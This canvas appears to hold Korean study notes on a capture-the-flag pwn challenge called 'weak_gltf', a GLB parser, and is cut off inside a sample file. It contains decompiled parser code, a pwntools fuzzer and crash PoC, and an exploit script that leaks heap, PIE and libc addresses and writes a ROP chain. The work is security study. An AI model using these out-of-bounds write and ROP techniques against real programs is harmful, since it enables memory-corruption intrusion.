{
	"nodes":[
		{"id":"1095f032dab33a21","type":"text","text":"```c\nvoid getGLB(void)\n{\n  const char *v0; // rax\n  const char *v1; // rax\n  __int64 v2; // [rsp+8h] [rbp-5E8h]\n  char v3[32]; // [rsp+28h] [rbp-5C8h] BYREF\n  char v4[8]; // [rsp+48h] [rbp-5A8h] BYREF\n  char v5[39]; // [rsp+50h] [rbp-5A0h] BYREF\n  bool BinaryFromFile; // [rsp+77h] [rbp-579h]\n  char v7[32]; // [rsp+78h] [rbp-578h] BYREF\n  char v8[32]; // [rsp+98h] [rbp-558h] BYREF\n  char v9[32]; // [rsp+B8h] [rbp-538h] BYREF\n  char v10[36]; // [rsp+D8h] [rbp-518h] BYREF\n  char v11[208]; // [rsp+108h] [rbp-4E8h] BYREF\n  char v12[1048]; // [rsp+1D8h] [rbp-418h] BYREF 이 샛기를 buffer overflow 시켜야 할듯\n\n  tinygltf::Model::Model((tinygltf::Model *)v12);// 사용자정의\n  tinygltf::TinyGLTF::TinyGLTF((tinygltf::TinyGLTF *)v11);// 사용자정의\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string((__int64)v10);// lib\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string((__int64)v9);// lib\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string((__int64)v8);// lib\n  createTmpFile[abi:cxx11]((__int64)v7);        // 사용자정의, length 와 data 입력, 내가 입력한 문자열로 임시파일을 만듬\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(v8);// lib\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v7);// lib\n  tinygltf::TinyGLTF::SetStoreOriginalJSONForExtrasAndExtensions((tinygltf::TinyGLTF *)v11, 0);// 사용자정의\n  BinaryFromFile = 0;\n  v2 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(v8);// lib\n  std::allocator<char>::allocator();            // lib\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<std::allocator<char>>(\n    v5,\n    v2,\n    v4);                                        // 사용자 정의\n  BinaryFromFile = tinygltf::TinyGLTF::LoadBinaryFromFile(\n                     (__int64)v11,\n                     (__int64)v12,\n                     (__int64)v10,\n                     (__int64)v9,\n                     (__int64)v5,\n                     1);                        // 사용자정의 아마 얘가 어택 벡터가 될 듯 하다\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v5);// lib\n  std::allocator<char>::~allocator(v4);         // lib\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v3, v8);// lib\n  removeTmpFile((__int64)v3);                   // 사용자\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v3);// lib\n                                                // 에러 검출\n  if ( (std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::empty(v9) & 1) == 0 )// lib\n  {\n    v0 = (const char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(v9);// lib\n    printf(\"Warn: %s\\n\", v0);\n  }\n  if ( (std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::empty(v10) & 1) == 0 )// lib\n  {\n    v1 = (const char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(v10);// lib\n    printf(\"Err: %s\\n\", v1);\n  }\n  if ( BinaryFromFile )\n  {\n    Dump((const tinygltf::Model *)v12);         // 사용자정의 dump 한 문자열들 출력\n    setBufferViews((tinygltf::Model *)v12);     // 사용자정의 , 이후의 작업 시작\n  }\n  else\n  {\n    printf(\"Failed to parse glTF\\n\");\n  }\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v8);\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v9);\n  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v10);\n  tinygltf::TinyGLTF::~TinyGLTF((tinygltf::TinyGLTF *)v11);\n  tinygltf::Model::~Model((tinygltf::Model *)v12);\n}\n```","x":-348,"y":329,"width":1308,"height":1751},
		{"id":"b585ce80da396636","type":"text","text":"```c\n_BOOL8 __fastcall tinygltf::TinyGLTF::LoadBinaryFromFile(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3,\n        __int64 a4,\n        __int64 a5,\n        int a6)\n{\n  unsigned int v6; // eax\n  char *v8; // [rsp+18h] [rbp-2F8h]\n  __int64 v9; // [rsp+20h] [rbp-2F0h]\n  __int64 v10; // [rsp+28h] [rbp-2E8h]\n  __int64 v11; // [rsp+30h] [rbp-2E0h]\n  __int64 v12; // [rsp+38h] [rbp-2D8h]\n  __int64 v13; // [rsp+40h] [rbp-2D0h]\n  __int64 v14; // [rsp+48h] [rbp-2C8h]\n  __int64 v15; // [rsp+50h] [rbp-2C0h]\n  __int64 v16; // [rsp+70h] [rbp-2A0h]\n  __int64 v17; // [rsp+78h] [rbp-298h]\n  __int64 v18; // [rsp+80h] [rbp-290h]\n  char v19[32]; // [rsp+98h] [rbp-278h] BYREF\n  char v20[39]; // [rsp+B8h] [rbp-258h] BYREF\n  char v22[32]; // [rsp+E0h] [rbp-230h] BYREF\n  _QWORD v23[3]; // [rsp+100h] [rbp-210h] BYREF\n  int v24; // [rsp+11Ch] [rbp-1F4h]\n  char v25[36]; // [rsp+120h] [rbp-1F0h] BYREF\n  char v26[16]; // [rsp+150h] [rbp-1C0h] BYREF\n  char v27[380]; // [rsp+160h] [rbp-1B0h] BYREF\n  int v28; // [rsp+2DCh] [rbp-34h]\n  __int64 v29; // [rsp+2E0h] [rbp-30h] /tmp/filezIUTMY/file14oOrf\n  __int64 v30; // [rsp+2E8h] [rbp-28h]\n  __int64 v31; // [rsp+2F0h] [rbp-20h]\n  char *v32; // [rsp+2F8h] [rbp-18h]\n  __int64 v33; // [rsp+300h] [rbp-10h]\n  bool BinaryFromMemory; // [rsp+30Fh] [rbp-1h]\n\n  v33 = a1;\n  v32 = (char *)a2;\n  v31 = a3;\n  v30 = a4;\n  v29 = a5;\n  v28 = a6;\n  std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::basic_stringstream(v26);\n  if ( *(_QWORD *)(a1 + 112) )\n  {\n    std::vector<unsigned char>::vector();\n    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string((__int64)v22);\n    if ( (*(__int64 (__fastcall **)(_QWORD *, char *, __int64, _QWORD))(a1 + 112))(v23, v22, v29, *(_QWORD *)(a1 + 136)) & 1 )// 여기서 v23에 주소가 저장됨\n    {\n      tinygltf::GetBaseDir((__int64)v19, v29);  // v29의 /tmp/filezIUTMY/file14o0rf 에서 /tmp/filezIUTMY를 가져와서 v19에 저장\n      v8 = v32;\n      v9 = v31;\n      v10 = v30;\n      v11 = std::vector<unsigned char>::at(v23, 0LL);\n      v6 = std::vector<unsigned char>::size(v23);// 얘가 binary 포인터\n      BinaryFromMemory = tinygltf::TinyGLTF::LoadBinaryFromMemory(a1, v8, v9, v10, v11, v6, (__int64)v19, v28);// 요기도 중요\n      v24 = 1;\n      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v19);\n    }\n    else\n    {\n      v15 = std::operator<<<std::char_traits<char>>(v27, \"Failed to read file: \");\n      v14 = std::operator<<<char>(v15, v29);\n      v13 = std::operator<<<std::char_traits<char>>(v14, \": \");\n      v12 = std::operator<<<char>(v13, v22);\n      std::ostream::operator<<(v12, &std::endl<char,std::char_traits<char>>);\n      if ( v31 )\n      {\n        std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::str(v20, v26);\n        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(v31);\n        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v20);\n      }\n      BinaryFromMemory = 0;\n      v24 = 1;\n    }\n    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v22);\n    std::vector<unsigned char>::~vector(v23);\n  }\n  else\n  {\n    v18 = std::operator<<<std::char_traits<char>>(v27, \"Failed to read file: \");\n    v17 = std::operator<<<char>(v18, v29);\n    v16 = std::operator<<<std::char_traits<char>>(v17, \": one or more FS callback not set\");\n    std::ostream::operator<<(v16, &std::endl<char,std::char_traits<char>>);\n    if ( v31 )\n    {\n      std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::str(v25, v26);\n      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(v31);\n      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v25);\n    }\n    BinaryFromMemory = 0;\n    v24 = 1;\n  }\n  std::__cxx11::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::~basic_stringstream(v26);\n  return BinaryFromMemory;\n}\n\n```","x":1520,"y":720,"width":1255,"height":2420},
		{"id":"d924286ea19526ca","type":"text","text":"```c\n_BOOL8 __fastcall tinygltf::TinyGLTF::LoadBinaryFromMemory(\n        __int64 a1,\n        char *a2,\n        __int64 a3,\n        __int64 a4,\n        __int64 a5,\n        unsigned int a6,\n        __int64 a7,\n        int a8)\n{\n  __int64 v9; // [rsp+18h] [rbp-128h]\n  __int64 v10; // [rsp+20h] [rbp-120h]\n  char v11[8]; // [rsp+50h] [rbp-F0h] BYREF\n  char v12[36]; // [rsp+58h] [rbp-E8h] BYREF\n  int v13; // [rsp+7Ch] [rbp-C4h] BYREF\n  unsigned int v14; // [rsp+80h] [rbp-C0h] BYREF\n  char v15[32]; // [rsp+90h] [rbp-B0h] BYREF\n  char v16[32]; // [rsp+B0h] [rbp-90h] BYREF\n  char v17[32]; // [rsp+D0h] [rbp-70h] BYREF\n  unsigned __int64 v18; // [rsp+F0h] [rbp-50h]\n  int v19; // [rsp+FCh] [rbp-44h] BYREF\n  unsigned int v20; // [rsp+100h] [rbp-40h] BYREF\n  unsigned int v21; // [rsp+104h] [rbp-3Ch] BYREF\n  int v22; // [rsp+108h] [rbp-38h] BYREF\n  unsigned int v23; // [rsp+10Ch] [rbp-34h]\n  __int64 v24; // [rsp+110h] [rbp-30h]\n  __int64 v25; // [rsp+118h] [rbp-28h]\n  __int64 v26; // [rsp+120h] [rbp-20h]\n  char *v27; // [rsp+128h] [rbp-18h]\n  __int64 v28; // [rsp+130h] [rbp-10h]\n  bool v29; // [rsp+13Fh] [rbp-1h]\n\n  v28 = a1;\n  v27 = a2;\n  v26 = a3;\n  v25 = a4;\n  v24 = a5;\n  v23 = a6;\n  if ( a6 < 0x14 )                              // a6 : binary length\n  {\n    if ( v26 )\n      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(\n        v26,\n        \"Too short data size for glTF Binary.\");\n    return 0;\n  }\n  if ( *(_BYTE *)v24 != 103 || *(_BYTE *)(v24 + 1) != 108 || *(_BYTE *)(v24 + 2) != 84 || *(_BYTE *)(v24 + 3) != 70 )// magic byte 검사\n  {\n    if ( v26 )\n      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(v26, \"Invalid magic.\");\n    return 0;\n  }\n  v22 = *(_DWORD *)(v24 + 4);\n  tinygltf::swap4((tinygltf *)&v22, (unsigned int *)a2);\n  v21 = *(_DWORD *)(v24 + 8);\n  tinygltf::swap4((tinygltf *)&v21, (unsigned int *)a2);\n  v20 = *(_DWORD *)(v24 + 12);\n  tinygltf::swap4((tinygltf *)&v20, (unsigned int *)a2);\n  v19 = *(_DWORD *)(v24 + 16);\n  tinygltf::swap4((tinygltf *)&v19, (unsigned int *)a2);\n  v18 = v20 + 20LL;\n  if ( v18 > (unsigned int)std::numeric_limits<unsigned int>::max() )\n  {\n    a2 = \"Invalid glTF binary. GLB data exceeds 4GB.\";\n    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(\n      v26,\n      \"Invalid glTF binary. GLB data exceeds 4GB.\");\n  }\n  if ( v18 > v23 || !v20 || v21 > v23 || v18 > v21 || v19 != 1313821514 )\n  {\n    if ( v26 )\n      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(\n        v26,\n        \"Invalid glTF binary.\");\n    return 0;\n  }\n  if ( (v18 & 3) != 0 && v26 )\n  {\n    a2 = \"JSON Chunk end does not aligned to a 4-byte boundary.\";\n    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(\n      v26,\n      \"JSON Chunk end does not aligned to a 4-byte boundary.\");\n  }\n  if ( v18 == v21 )\n  {\n    *(_QWORD *)a1 = 0LL;\n    *(_QWORD *)(a1 + 8) = 0LL;\nLABEL_48:\n    v9 = v24 + 20;\n    v10 = v20;\n    std::allocator<char>::allocator();\n    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v12, v9, v10, v11);\n    std::allocator<char>::~allocator(v11);\n    *(_BYTE *)(a1 + 16) = 1;\n    v29 = (tinygltf::TinyGLTF::LoadFromString(a1, (_DWORD)v27, v26, v25, (int)v24 + 20, v20, a7, a8) & 1) != 0;\n    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v12);\n    return v29;\n  }\n  if ( v18 + 12 <= v21 )\n  {\n    v14 = *(_DWORD *)(v24 + v18);\n    tinygltf::swap4((tinygltf *)&v14, (unsigned int *)a2);\n    v13 = *(_DWORD *)(v24 + v18 + 4);\n    tinygltf::swap4((tinygltf *)&v13, (unsigned int *)a2);\n    if ( v14 >= 4 )\n    {\n      if ( (v14 & 3) != 0 )\n      {\n        if ( v26 )\n          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(\n            v26,\n            \"BIN Chunk end does not aligned to a 4-byte boundary.\");\n        return 0;\n      }\n      else if ( v18 + v14 <= v21 )\n      {\n        if ( v13 == 5130562 )\n        {\n          *(_QWORD *)a1 = v18 + v24 + 8;\n          *(_QWORD *)(a1 + 8) = v14;\n          goto LABEL_48;\n        }\n        if ( v26 )\n          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(\n            v26,\n            \"Invalid type for chunk1 data.\");\n        return 0;\n      }\n      else\n      {\n        if ( v26 )\n          std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(\n            v26,\n            \"BIN Chunk data length exceeds the GLB size.\");\n        return 0;\n      }\n    }\n    else\n    {\n      if ( v26 )\n        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(\n          v26,\n          \"Insufficient Chunk1(BIN) data size.\");\n      return 0;\n    }\n  }\n  else\n  {\n    if ( v26 )\n    {\n      std::__cxx11::to_string((std::__cxx11 *)v15, v18 - v21 + 12);\n      std::operator+<char>(\n        v16,\n        \"Insufficient storage space for Chunk1(BIN data). At least Chunk1 Must have 4 bytes or more bytes, but got \",\n        v15);\n      std::operator+<char>(v17, v16, (char *)&off_AEC96 + 1);\n      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(v26);\n      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v17);\n      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v16);\n      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v15);\n    }\n    return 0;\n  }\n}\n```","x":3200,"y":1700,"width":1279,"height":3969},
		{"id":"f557d9cef7414db4","type":"text","text":"# weak_gltf","x":-283,"y":-340,"width":250,"height":60},
		{"id":"97e32be64eebfac5","type":"text","text":"해당 타겟은 glb 파일을 파싱하는 프로그램이다.\n파일 구조를 유지하면서 mutate 해아한다.","x":-420,"y":-280,"width":525,"height":120},
		{"id":"144e665869992ef1","type":"text","text":"Attack Surface\n\n![](https://i.imgur.com/GEsx3VR.png)\n\nGLB 파일의 길이를 입력받는다.\n\n![](https://i.imgur.com/koSDYEt.png)\nGLB 파일의 Data 를 입력한다\n\n![](https://i.imgur.com/xLNVvN6.png)\n\ndata를 입력하고 Bufferview index를 입력한다.\n\n![](https://i.imgur.com/EtfeH9Q.png)\nindex, offset, data를 입력하고 종료된다.","x":-2240,"y":-480,"width":1425,"height":1020},
		{"id":"13ddc15d9ea25907","type":"text","text":"Attack Vector\n아마 파일을 buffer에 읽어오는 과정에서의 overflow 아닐까\n1. LoadBinaryFromFile ","x":-404,"y":-127,"width":494,"height":185},
		{"id":"dba6063f7487e124","type":"text","text":"슈발,, 아니였음\n\nAttack Vector는 ","x":181,"y":-64,"width":359,"height":122},
		{"id":"4b1f411adf3ab1ed","type":"text","text":"```c\nvoid *__fastcall setBufferViews(tinygltf::Model *a1)\n{\n  __int64 v1; // rax\n  __int64 v3; // rax\n  unsigned __int64 v4; // [rsp+8h] [rbp-48h]\n  __int64 v5; // [rsp+10h] [rbp-40h]\n  char *src; // [rsp+18h] [rbp-38h]\n  unsigned int n; // [rsp+24h] [rbp-2Ch]\n  size_t n_4; // [rsp+28h] [rbp-28h]\n  __int64 v9; // [rsp+38h] [rbp-18h] BYREF\n  unsigned int v10; // [rsp+44h] [rbp-Ch] BYREF\n  tinygltf::Model *v11; // [rsp+48h] [rbp-8h]\n\n  v11 = a1;\n  std::operator<<<std::char_traits<char>>(&std::cout, \"Bufferview index: \");// 해당 문자열 출력\n  std::istream::operator>>(&std::cin, &v10);    // index 입력받기\n  getchar();\n  v4 = v10;                                     // v4에 인덱스\n  if ( v4 < std::vector<tinygltf::BufferView>::size(v11 + 72) )// size검증, v4가 unsigned 여서 음수도 안됨, 여기서 우항은 8이 나옴, 대충 index 니깐 그려려니 함\n  {\n    std::operator<<<std::char_traits<char>>(&std::cout, \"Bufferview offset: \");// offset 입력받기\n    st```d::istream::operator>>(&std::cin, &v9);\n    getchar();\n    n_4 = std::vector<tinygltf::BufferView>::operator[](v11 + 72, v10);\n    n = *(n_4 + 48);                            // 해당 index의 buffer data 부분의 크기를 가져옴\n    std::operator<<<std::char_traits<char>>(&std::cout, \"Buffer data: \");\n    src = operator new[](n);                    // n크기의 heap 할당\n    std::istream::read(&std::cin, src, n);\n    v5 = std::vector<tinygltf::Buffer>::operator[](v11 + 48, *(n_4 + 32));\n    v3 = std::vector<unsigned char>::at(v5 + 32, 0LL);\n    return memcpy((v9 + v3), src, n);           // 복사될 곳:해당하는 buffer data 주소, 복사할 것, 길이\n  }\n  else\n  {\n    v1 = std::operator<<<std::char_traits<char>>(&std::cout, \"Invalid bufferView index\");\n    return std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);\n  }\n}\n```","x":1200,"y":-628,"width":1511,"height":1002},
		{"id":"c692412c8348de45","type":"text","text":"```python\nfrom pwn import *\nimport random\n\n# context.log_level= 'debug'\n\ndef get_random_element(my_list):\n    # 리스트에서 랜덤한 요소 선택\n    random_element = random.choice(my_list)\n    return random_element\n\ndef generate_random_bytes(lower_bound, upper_bound):\n    # 원하는 범위 내에서 랜덤 정수 생성\n    random_number = random.randint(lower_bound, upper_bound)\n\n    # 정수를 바이트로 변환\n    byte_representation = str(random_number).encode('utf-8')\n\n    return byte_representation\n\nwith open('./bin/sample.glb', 'rb') as binary_file:\n    binary_data = binary_file.read()\n\n\nwhile(True):\n    \n    p = process(\"./bin/weak_gltf\")\n\n    p.sendlineafter(b\"file: \", str(len(binary_data)+1))\n\n    p.sendlineafter(b\"file: \", binary_data)\n\n    index = [b'0',b'1',b'2',b'3',b'4',b'5',b'6',b'7']\n\n    ind = get_random_element(index)\n\n    p.sendlineafter(b\"index: \", ind)\n\n    off = generate_random_bytes(0, 1000000000)\n\n    p.sendlineafter(b\"offset: \", off)\n\n    data = b'a'*0x120\n\n    p.sendlineafter(b\"data: \", data)\n    # p.close()\n    # p.interactive()\n    sleep(1)\n    num = p.poll(False)\n    if (num == -11):\n        print(\"crash\")\n        crash = '''from pwn import *\n        \nwith open('./bin/sample.glb', 'rb') as binary_file:\n    binary_data = binary_file.read()\n    \np = process(\"./bin/weak_gltf\")\n\np.sendlineafter(b\"file: \", str(len(binary_data)+1))\n\np.sendlineafter(b\"file: \", binary_data)\n\np.sendlineafter(b\"index: \", b\\'''' + ind.decode('utf-8') +'''\\')\n\np.sendlineafter(b\"offset: \", b\\'''' + off.decode('utf-8') +'''\\')\n\ndata = b'a'*0x120\n\np.sendlineafter(b\"data: \", data)\n\nsleep(1)\n'''\n        with open(\"crash.py\", \"w\") as f:\n            f.write(crash)\n        \n        break\n```","x":-2107,"y":817,"width":1159,"height":1863},
		{"id":"edef6ed9c66584f8","type":"text","text":"# Fuzzer","x":-1609,"y":760,"width":164,"height":57},
		{"id":"ea851d68b8dc888d","type":"text","text":"![](https://i.imgur.com/gKdVjuS.png)","x":-2073,"y":2680,"width":1092,"height":280},
		{"id":"6c8a8108b48f6d83","type":"text","text":"crash가 발생했다. \nindex는 4, offset은 361893681 이 들어갔는데 해당 코드를 보면 offset에 대한 검증이 없어서 out of boundary가 발생한다. 이로인해 다음과 같이 이상한 숫자를 넣으면 그에 해당하는 주소를 참조해서 segmentation fault 가 발생한다. 이로 인해 나는 임의 주소 쓰기가 가능하다는 것을 알았다.","x":-2073,"y":2960,"width":1092,"height":226},
		{"id":"bf9105df09e08d92","type":"text","text":"```c\nvoid *__fastcall setBufferViews(tinygltf::Model *a1)\n{\n  __int64 v1; // rax\n  __int64 v3; // rax\n  unsigned __int64 v4; // [rsp+8h] [rbp-48h]\n  __int64 v5; // [rsp+10h] [rbp-40h]\n  char *src; // [rsp+18h] [rbp-38h]\n  unsigned int n; // [rsp+24h] [rbp-2Ch]\n  size_t n_4; // [rsp+28h] [rbp-28h]\n  __int64 v9; // [rsp+38h] [rbp-18h] BYREF\n  unsigned int v10; // [rsp+44h] [rbp-Ch] BYREF\n  tinygltf::Model *v11; // [rsp+48h] [rbp-8h]\n\n  v11 = a1;\n  std::operator<<<std::char_traits<char>>(&std::cout, \"Bufferview index: \");// 해당 문자열 출력\n  std::istream::operator>>(&std::cin, &v10);    // index 입력받기\n  getchar();\n  v4 = v10;                                     // v4에 인덱스\n  if ( v4 < std::vector<tinygltf::BufferView>::size(v11 + 72) )// size검증, v4가 unsigned 여서 음수도 안됨, 여기서 우항은 8이 나옴, 대충 index 니깐 그려려니 함\n  {\n    std::operator<<<std::char_traits<char>>(&std::cout, \"Bufferview offset: \");// offset 입력받기\n    std::istream::operator>>(&std::cin, &v9);\n    getchar();\n    n_4 = std::vector<tinygltf::BufferView>::operator[](v11 + 72, v10);\n    n = *(n_4 + 48);                            // 해당 index의 buffer data 부분의 크기를 가져옴\n    std::operator<<<std::char_traits<char>>(&std::cout, \"Buffer data: \");\n    src = operator new[](n);                    // n크기의 heap 할당\n    std::istream::read(&std::cin, src, n);\n    v5 = std::vector<tinygltf::Buffer>::operator[](v11 + 48, *(n_4 + 32));\n    v3 = std::vector<unsigned char>::at(v5 + 32, 0LL);\n    return memcpy((v9 + v3), src, n);           // 복사될 곳:해당하는 buffer data 주소, 복사할 것, 길이\n  }\n  else\n  {\n    v1 = std::operator<<<std::char_traits<char>>(&std::cout, \"Invalid bufferView index\");\n    return std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);\n  }\n}\n```","x":-981,"y":2680,"width":1072,"height":1029},
		{"id":"5207696a7974b958","type":"text","text":"![](https://i.imgur.com/vPrAz33.png)","x":-3252,"y":2231,"width":1090,"height":380},
		{"id":"6c61f80192fa9006","type":"text","text":"```python\nfrom pwn import *\n        \nwith open('./bin/sample.glb', 'rb') as binary_file:\n    binary_data = binary_file.read()\n    \np = process(\"./bin/weak_gltf\")\n\np.sendlineafter(b\"file: \", str(len(binary_data)+1))\n\np.sendlineafter(b\"file: \", binary_data)\n\np.sendlineafter(b\"index: \", b'5')\n\np.sendlineafter(b\"offset: \", b'70190414')\n\ndata = b'a'*0x120\n\np.sendlineafter(b\"data: \", data)\n\nsleep(1)\n```","x":-2991,"y":2611,"width":569,"height":568},
		{"id":"1a14010a004a9add","type":"text","text":"crash가 터지면 PoC를 자동으로 만들어준다.","x":-2920,"y":2160,"width":427,"height":71},
		{"id":"f47ea630baea3e55","type":"text","text":"![](https://i.imgur.com/YwEac9y.png)","x":-756,"y":-734,"width":376,"height":254},
		{"id":"bd6fa487988a5f23","type":"text","text":"offset 1 => 1 byte","x":-835,"y":-928,"width":250,"height":60},
		{"id":"26df2b3250165556","type":"text","text":"해당 부분을 보면 length로 출력되는 길이를 정하고 byteoffset으로 BIN을 기준으로 offset 만큼을 기준으로 한다. 해당 부분을 조작함으로서 임의 주소 읽기가 가능하다. heap leak 가능. 근데 너무 크게 하면 이상해짐\n\nlength는 제한이 있고 offset은 제한이 없지만 offset을 음수로 했을 때 해당 chunk 이전을 참조할 수는 없고 양수로는 무한히 커진다. 하지만 주소가 랜덤이기때문에 heap 이후는 알 방법이 없음, 즉 얻을 수 있는건 heap base, pie base 정도, chunk에 존재하는것만 가능\n\n참고로 출력되는 값은 hex고 파일에는 10진수임","x":-380,"y":-780,"width":540,"height":373},
		{"id":"5c5da55fa92742d9","x":520,"y":2660,"width":683,"height":2099,"type":"text","text":"```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\nlib_offset = 0x21ace0\npie_offset = 0x12cd3\nheap_target_offset = 0x580\ngot_target_off = 0xe91d0\n# got overwrite 하면 될듯\n\ndef bytes_str_to_big_endian_integer(byte_str): # byte를 hex로 바꾸는 함수\n    byte_values = [int(byte, 16) for byte in reversed(byte_str.split())]\n    int_value = int.from_bytes(byte_values, byteorder='big')\n    return int_value\n\nwith open('./bin/sample.glb', 'rb') as binary_file:\n    binary_data = binary_file.read()\n\np = process(\"./bin/weak_gltf\")\n\npause()\n\np.sendlineafter(b\"file: \", str(len(binary_data)+1))\n\np.sendlineafter(b\"file: \", binary_data)\n\np.recvuntil(b'byteOffset   : cc8\\n    byteStride   : 0\\n    buffer data  : \\n      ')\nstack_leak_byte = p.recv(17)\nstack_leak_real = bytes_str_to_big_endian_integer(stack_leak_byte)\nstack_target_add = stack_leak_real + 0xe48\n\np.recvuntil(b'byteOffset   : 570\\n    byteStride   : 0\\n    buffer data  : \\n      ')\nheap_leak_byte = p.recv(17)\nheap_leak_real = bytes_str_to_big_endian_integer(heap_leak_byte)\nheap_target_base = heap_leak_real - heap_target_offset\n\np.recvuntil(b'byteOffset   : b20\\n    byteStride   : 0\\n    buffer data  : \\n      ')\npie_leak_byte = p.recv(17)\npie_leak_real = bytes_str_to_big_endian_integer(pie_leak_byte)\npie_base = pie_leak_real - pie_offset\n\ntarget_add = pie_base+got_target_off\n\np.recvuntil(b'byteOffset   : 1b30\\n    byteStride   : 0\\n    buffer data  : \\n      ')\nlib_leak_byte = p.recv(17)\nlib_leak_real = bytes_str_to_big_endian_integer(lib_leak_byte)\nlibc_base = lib_leak_real-lib_offset\none_gadget = libc_base + 0xebc88\npop_rdx_r12 = libc_base + 0x000000000011f2e7\npop_rsi = libc_base + 0x000000000002be51\n\n# print(hex(heap_target_base))\n# print(hex(lib_leak_real))\n# print(hex(pie_base))\n\np.sendlineafter(b'index:', b'0')\n\noffset = stack_target_add - heap_target_base\n# print(offset)\n\n\np.sendlineafter(b'offset:', str(offset))\n\nexploit = p64(pop_rdx_r12)\nexploit += p64(0)\nexploit += p64(0)\nexploit += p64(pop_rsi)\nexploit += p64(0)\nexploit += p64(one_gadget)\n\np.sendafter(b'data:', exploit)\n\n#one_gadget 까지는 갔는데 조건이 안맞음\n\n# 저렇게 하면 rsp가 다른데 있어서 안됨, \n# 최후의 수단 stack base 구해서 ret 에 rop 하는거임 이게 맞는듯\np.interactive()\n\n# 일단 처음에 length, data 입력을 함, data의 값으로 아마 취약점 터질듯\n```"},
		{"id":"92540545221ea288","x":770,"y":2600,"width":183,"height":60,"type":"text","text":"# payload"},
		{"id":"aedae4ec58ed4c31","x":804,"y":-1886,"width":516,"height":1186,"type":"text","text":"```\nglTF\u0002���<\u000f��(\u000b��JSON{\n\n\"asset\": {\n\n\"version\": \"2.0\"\n\n},\n\n\"scene\": 0,\n\n\"buffers\": [\n\n{\n\n\"byteLength\": 1016\n\n}\n\n],\n\n\"bufferViews\": [\n\n{\n\n\"buffer\": 0,\n\n\"byteLength\": 48,\n\n\"byteOffset\": 0\n\n},\n\n{\n\n\"buffer\": 0,\n\n\"byteLength\": 4,\n\n\"byteOffset\": 4\n\n},\n\n{\n\n\"buffer\": 0,\n\n\"byteLength\": 7,\n\n\"byteOffset\": 8,\n\n\"target\": 34963\n\n},\n\n{\n\n\"buffer\": 0,\n\n\"byteLength\": 288,\n\n\"byteOffset\": 80,\n\n\"target\": 34962\n\n},\n\n{\n\n\"buffer\": 0,\n\n\"byteLength\": 28,\n\n\"byteOffset\": 3272,\n\n\"target\": 34962\n\n},\n\n{\n\n\"buffer\": 0,\n\n\"byteLength\": 19,\n\n\"byteOffset\": 1392,\n\n\"target\": 34962\n\n},\n\n{\n\n\"buffer\": 0,\n\n\"byteLength\": 8,\n\n\"byteOffset\": 2848\n\n},\n\n{\n\n\"buffer\": 0,\n\n\"byteLength\": 14,\n\n\"byteOffset\": 6960\n\n}\n\n],\n\n\"scenes\": [\n\n{\n\n\"name\": \"Root Scene\",\n\n\"nodes\": [\n\n0\n\n]\n\n}\n\n],\n\n\"accessors\": [\n\n{\n\n\"componentType\": 5126,\n\n\"type\": \"SCALAR\",\n\n\"count\": 1,\n\n\"bufferView\": 0,\n\n\"byteOffset\": 0,\n\n\"min\": [\n\n0.0\n\n],\n\n\"max\": [\n\n0.0\n\n]\n\n},\n\n{\n\n\"componentType\": 5126,\n\n\"type\": \"SCALAR\",\n\n\"count\": 